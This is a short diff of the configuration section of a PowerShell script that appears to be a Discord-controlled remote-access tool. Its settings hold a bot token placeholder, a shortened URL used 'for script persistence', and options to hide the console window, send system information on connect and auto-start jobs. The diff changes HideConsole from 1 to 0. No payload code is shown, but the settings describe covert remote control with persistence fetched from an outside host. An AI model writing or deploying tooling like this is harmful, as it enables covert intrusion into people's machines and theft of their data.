@@ -12,7 +12,7 @@
 # Configuration
 $global:Token = "$tk"  # Replace with your Discord bot token
 $global:ParentScriptUrl = "https://is.gd/y92xe4"  # URL for script persistence
-$global:HideConsole = 1  # Set to 1 to hide the console window
+$global:HideConsole = 0  # Set to 1 to hide the console window
 $global:CreateChannels = 1  # Set to 1 to create new channels on session start
 $global:InfoOnConnect = 1  # Set to 1 to send system info on connect
 $global:AutoStartJobs = 1  # Set to 1 to start all jobs automatically
